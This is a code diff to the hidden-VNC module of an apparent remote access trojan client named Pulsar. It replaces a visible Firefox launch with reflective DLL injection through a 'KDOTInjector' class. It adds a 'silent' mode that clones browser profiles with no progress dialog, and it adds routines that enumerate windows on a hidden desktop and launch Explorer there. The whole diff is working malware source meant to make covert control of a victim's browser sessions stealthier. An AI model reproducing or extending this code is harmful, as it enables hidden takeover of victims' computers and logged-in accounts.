@@ -26,6 +26,19 @@ namespace Pulsar.Client.Helper.HVNC
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool CloseHandle(IntPtr hObject);
 
+        [DllImport("user32.dll")]
+        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumWindowsDelegate lpfn, IntPtr lParam);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool CloseDesktop(IntPtr hDesktop);
+
+        private delegate bool EnumWindowsDelegate(IntPtr hWnd, IntPtr lParam);
+        private const uint DESKTOP_ENUMERATE = 64U;
+        private const uint GENERIC_ALL = 511U;
+
         private const uint WAIT_OBJECT_0 = 0x00000000;
         private const uint WAIT_TIMEOUT = 0x00000102;
         private const uint INFINITE = 0xFFFFFFFF;
@@ -110,90 +123,68 @@ namespace Pulsar.Client.Helper.HVNC
             this.CreateProc(command);
         }
 
-        public async Task StartFirefoxAsync()
+        /// <summary>
+        /// Launches Firefox with HVNC DLL injection and silent profile cloning.
+        /// FIXED: Now uses KDOTInjector for proper DLL injection instead of visible cmd.exe launch.
+        /// </summary>
+        public async Task StartFirefoxAsync(byte[] dllbytes)
         {
-            BrowserCloneProgressSession progressSession = null;
-            Task completionTask = Task.CompletedTask;
-            bool cloneSucceeded = false;
-            bool cloneCancelled = false;
-
             try
             {
-                string basePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mozilla", "Firefox");
-
-                if (!Directory.Exists(basePath))
+                var firefoxConfig = BrowserConfiguration.GetConfig("Firefox");
+                if (firefoxConfig == null || !BrowserConfiguration.ValidateConfig(firefoxConfig))
                 {
-                    Debug.WriteLine("Firefox base directory not found.");
+                    Debug.WriteLine("Firefox executable not found.");
                     return;
                 }
 
-                string sourceDir = Path.Combine(basePath, "Profiles");
-                if (!Directory.Exists(sourceDir))
+                Debug.WriteLine($"Found Firefox at: {firefoxConfig.ExecutablePath}");
+
+                // Clone profile using unified approach with silent mode
+                var cloneResult = await CloneBrowserProfileAsync(firefoxConfig.SearchPattern, firefoxConfig.ReplacementPath, "Firefox", silent: true).ConfigureAwait(false);
+                if (cloneResult.Cancelled)
                 {
-                    Debug.WriteLine("Firefox profiles directory not found.");
+                    Debug.WriteLine("Firefox profile cloning cancelled by user – skipping injection.");
                     return;
                 }
-
-                string destination = Path.Combine(basePath, "fudasf");
-                if (Directory.Exists(destination))
-                {
-                    DeleteFolder(destination);
-                }
-
-                progressSession = await BrowserCloneProgressSession.TryCreateAsync("Firefox").ConfigureAwait(false);
-                progressSession?.ReportPreparing();
-
-                CancellationToken cancellationToken = progressSession?.CancellationToken ?? CancellationToken.None;
 
                 try
                 {
-                    cloneSucceeded = await Task.Run(() => HandleHijacker.ForceCopyDirectory(sourceDir, destination, killIfFailed: false, progressSession?.Progress, cancellationToken)).ConfigureAwait(false);
-                }
-                catch (OperationCanceledException)
-                {
-                    cloneCancelled = true;
-                    CleanupCancelledClone(destination);
-                }
+                    // Validate inputs before injection
+                    if (dllbytes == null || dllbytes.Length == 0)
+                    {
+                        throw new ArgumentException("DLL bytes are empty or null.");
+                    }
+                    if (!System.IO.File.Exists(firefoxConfig.ExecutablePath))
+                    {
+                        throw new FileNotFoundException($"Firefox executable not found: {firefoxConfig.ExecutablePath}");
+                    }
 
-                if (cloneCancelled)
-                {
-                    Debug.WriteLine("Firefox profile cloning cancelled by user – skipping launch.");
+                    // Use KDOTInjector for reflective DLL injection (same as Chrome, Edge, Brave, Opera)
+                    Debug.WriteLine($"Starting Firefox injection - EXE: {firefoxConfig.ExecutablePath}, DLL size: {dllbytes.Length}");
+                    int processId = await Task.Run(() => KDOTInjector.Start(dllbytes, firefoxConfig.ExecutablePath, firefoxConfig.SearchPattern, firefoxConfig.ReplacementPath)).ConfigureAwait(false);
+                    if (processId > 0)
+                    {
+                        Debug.WriteLine($"Firefox started successfully with PID {processId}.");
+                    }
+                    else
+                    {
+                        Debug.WriteLine("Failed to start Firefox process - invalid process ID.");
+                    }
                 }
-                else if (cloneSucceeded)
+                catch (Exception injectionEx)
                 {
-                    Debug.WriteLine("Firefox profile cloned successfully.");
+                    Debug.WriteLine($"Error during Firefox DLL injection: {injectionEx.GetType().Name}: {injectionEx.Message}");
+                    throw;
                 }
-                else
-                {
-                    Debug.WriteLine("Firefox profile cloning reported partial success; some files may be locked.");
-                }
-
-                bool completedSuccessfully = cloneSucceeded && !cloneCancelled;
-                completionTask = progressSession?.ReportCompletionAsync(completedSuccessfully) ?? Task.CompletedTask;
-
-                if (cloneCancelled)
-                {
-                    return;
-                }
-
-                string startCommand = $"Conhost --headless cmd.exe /c start firefox --profile=\"{destination}\"";
-                CreateProc(startCommand);
             }
             catch (OperationCanceledException)
             {
-                completionTask = progressSession?.ReportCompletionAsync(false) ?? Task.CompletedTask;
-                cloneCancelled = true;
                 Debug.WriteLine("Firefox profile cloning cancelled by user.");
             }
             catch (Exception ex)
             {
-                completionTask = progressSession?.ReportCompletionAsync(false) ?? Task.CompletedTask;
                 Debug.WriteLine("Error starting Firefox: " + ex.Message);
-            }
-            finally
-            {
-                await completionTask.ConfigureAwait(false);
-                progressSession?.Dispose();
             }
         }
 
@@ -562,28 +553,149 @@ namespace Pulsar.Client.Helper.HVNC
             this.CreateProc(startCommand);
         }
 
+        /// <summary>
+        /// Checks if windows exist on the specified desktop with detailed logging.
+        /// </summary>
+        private bool DoesDesktopHaveWindows(string desktopName)
+        {
+            bool hasWindows = false;
+            int windowCount = 0;
+            try
+            {
+                IntPtr desktopHandle = OpenDesktop(desktopName, 0, true, GENERIC_ALL);
+                if (desktopHandle == IntPtr.Zero)
+                {
+                    Debug.WriteLine($"[StartExplorer] Failed to open desktop '{desktopName}'");
+                    return false;
+                }
+
+                try
+                {
+                    EnumDesktopWindows(desktopHandle, (hWnd, lParam) =>
+                    {
+                        if (hWnd != IntPtr.Zero)
+                        {
+                            windowCount++;
+                            hasWindows = true;
+                            Debug.WriteLine($"[StartExplorer] Window #{windowCount} found: 0x{hWnd:X8}");
+                            return true; // Continue to count all windows
+                        }
+                        return true;
+                    }, IntPtr.Zero);
+                }
+                finally
+                {
+                    CloseDesktop(desktopHandle);
+                }
+
+                if (hasWindows)
+                {
+                    Debug.WriteLine($"[StartExplorer] Desktop '{desktopName}' verified with {windowCount} visible window(s)");
+                }
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[StartExplorer] Error checking desktop windows: {ex.Message}");
+            }
+
+            return hasWindows;
+        }
+
+        /// <summary>
+        /// Waits for Explorer windows to be created on the desktop with detailed attempt logging.
+        /// </summary>
+        private bool WaitForExplorerWindows(int maxWaitMs = 5000)
+        {
+            int elapsedMs = 0;
+            const int checkIntervalMs = 500;
+            int attemptCount = 0;
+
+            Debug.WriteLine($"[StartExplorer] Waiting up to {maxWaitMs}ms for Explorer windows to appear...");
+
+            while (elapsedMs < maxWaitMs)
+            {
+                attemptCount++;
+                if (DoesDesktopHaveWindows(this.DesktopName))
+                {
+                    Debug.WriteLine($"[StartExplorer] ✓ Explorer windows detected after {elapsedMs}ms (attempt #{attemptCount})");
+                    return true;
+                }
+
+                Debug.WriteLine($"[StartExplorer] Attempt #{attemptCount}: No windows found, waiting {checkIntervalMs}ms... ({elapsedMs}/{maxWaitMs}ms)");
+                Thread.Sleep(checkIntervalMs);
+                elapsedMs += checkIntervalMs;
+            }
+
+            Debug.WriteLine($"[StartExplorer] ✗ Timeout after {maxWaitMs}ms ({attemptCount} attempts). Windows may not have appeared yet.");
+            return false;
+        }
+
         public void StartExplorer()
         {
-            uint num = 2U;
-            string name = "TaskbarGlomLevel";
-            string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
-            using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
+            try
             {
-                if (registryKey != null)
+                Debug.WriteLine("[StartExplorer] ========== Starting Explorer Process Initialization ==========");
+                Debug.WriteLine($"[StartExplorer] Desktop: {this.DesktopName}");
+                Debug.WriteLine($"[StartExplorer] Process ID: {System.Diagnostics.Process.GetCurrentProcess().Id}");
+                
+                uint num = 2U;
+                string name = "TaskbarGlomLevel";
+                string name2 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
+                using (RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(name2, true))
                 {
-                    object value = registryKey.GetValue(name);
-                    if (value is uint)
+                    if (registryKey != null)
                     {
-                        uint num2 = (uint)value;
-                        if (num2 != num)
+                        object value = registryKey.GetValue(name);
+                        if (value is uint)
                         {
-                            registryKey.SetValue(name, num, RegistryValueKind.DWord);
+                            uint num2 = (uint)value;
+                            if (num2 != num)
+                            {
+                                registryKey.SetValue(name, num, RegistryValueKind.DWord);
+                                Debug.WriteLine("[StartExplorer] Updated TaskbarGlomLevel registry key");
+                            }
                         }
                     }
                 }
+                
+                string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
+                Debug.WriteLine($"[StartExplorer] Launching: {explorerPath}");
+                Debug.WriteLine("[StartExplorer] Calling CreateProc...");
+                
+                bool success = this.CreateProc(explorerPath);
+                
+                if (!success)
+                {
+                    Debug.WriteLine("[StartExplorer] ✗ CreateProc failed - process may not have started");
+                    return;
+                }
+
+                Debug.WriteLine("[StartExplorer] ✓ CreateProc returned success, waiting for windows to appear...");
+
+                // Wait for Explorer windows to appear on the desktop
+                System.Diagnostics.Stopwatch waitTimer = System.Diagnostics.Stopwatch.StartNew();
+                bool windowsAppeared = WaitForExplorerWindows(5000);
+                waitTimer.Stop();
+                
+                if (windowsAppeared)
+                {
+                    Debug.WriteLine($"[StartExplorer] ✓ Explorer windows confirmed ready after {waitTimer.ElapsedMilliseconds}ms");
+                }
+                else
+                {
+                    Debug.WriteLine($"[StartExplorer] ⚠ Warning: Explorer windows may not be ready after {waitTimer.ElapsedMilliseconds}ms, proceeding anyway");
+                }
+
+                // Give Explorer a bit more time to fully initialize
+                Debug.WriteLine("[StartExplorer] Final initialization delay (500ms)...");
+                Thread.Sleep(500);
+                Debug.WriteLine("[StartExplorer] ========== Explorer Initialization Complete ==========");
             }
-            string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe /NoUACCheck";
-            this.CreateProc(explorerPath);
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"[StartExplorer] ✗ Exception during initialization: {ex.Message}");
+                Debug.WriteLine($"[StartExplorer] Stack Trace: {ex.StackTrace}");
+            }
         }
 
         /// <summary>
@@ -592,7 +704,9 @@ namespace Pulsar.Client.Helper.HVNC
         /// </summary>
         /// <param name="searchPattern">Relative path pattern (e.g., "Local\Google\Chrome\User Data")</param>
         /// <param name="replacementPath">Relative path for destination (e.g., "Local\Google\Chrome\KDOT")</param>
-        private async Task<CloneResult> CloneBrowserProfileAsync(string searchPattern, string replacementPath, string browserName = null)
+        /// <param name="browserName">Name of browser being cloned (for UI display)</param>
+        /// <param name="silent">If true, no UI progress dialog is shown</param>
+        private async Task<CloneResult> CloneBrowserProfileAsync(string searchPattern, string replacementPath, string browserName = null, bool silent = false)
         {
             BrowserCloneProgressSession progressSession = null;
             Task completionTask = Task.CompletedTask;
@@ -600,7 +714,7 @@ namespace Pulsar.Client.Helper.HVNC
 
             try
             {
-                progressSession = await BrowserCloneProgressSession.TryCreateAsync(browserName).ConfigureAwait(false);
+                progressSession = await BrowserCloneProgressSession.TryCreateAsync(browserName, silent).ConfigureAwait(false);
                 progressSession?.ReportPreparing();
 
                 CancellationToken cancellationToken = progressSession?.CancellationToken ?? CancellationToken.None;
